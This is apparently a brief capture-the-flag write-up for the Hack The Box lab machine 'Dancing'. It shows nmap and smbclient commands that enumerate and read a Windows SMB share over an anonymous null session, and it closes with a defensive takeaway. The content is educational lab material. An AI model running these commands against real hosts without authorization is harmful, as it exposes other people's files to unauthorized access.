# Dancing

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 0) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | SMB null session |

## Overview
A Windows host exposing an SMB share accessible with no credentials (null session).

## Enumeration
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
# 445/tcp open  microsoft-ds
smbclient -L //<TARGET_IP>/ -N        # list shares, no auth
```

## Exploitation
```bash
smbclient //<TARGET_IP>/WorkShares -N
smb> ls ; cd <user> ; get <file>
```
Default admin shares (C$, ADMIN$, IPC$) were not accessible without creds; the custom
`WorkShares` share was readable over a null session.

## Key Takeaway
Disable anonymous/guest SMB access and scope share permissions to named principals.
